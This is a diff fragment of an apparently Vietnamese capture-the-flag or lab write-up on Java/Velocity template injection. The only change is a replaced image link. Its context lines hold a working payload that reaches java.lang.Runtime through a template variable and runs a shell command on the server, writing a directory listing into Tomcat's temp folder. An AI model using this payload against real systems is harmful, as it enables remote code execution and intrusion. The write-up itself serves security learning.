@@ -124,8 +124,7 @@ Như vậy chỉ cần thay payload thành
 ```
 $date.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ls / > /tmp/$(ls /tmp | grep tomcat-docbase)/test1')
 ```
-![image](https://github.com/user-attachments/assets/c13fe519-db2e-4553-b586-5287c3fea952)
-
+![image](https://github.com/user-attachments/assets/910bcce3-d689-4e15-82a7-9dc9972ca997)
 
 ![image](https://github.com/user-attachments/assets/98e7217a-c724-47dc-8723-d4937c5a5fae)
 
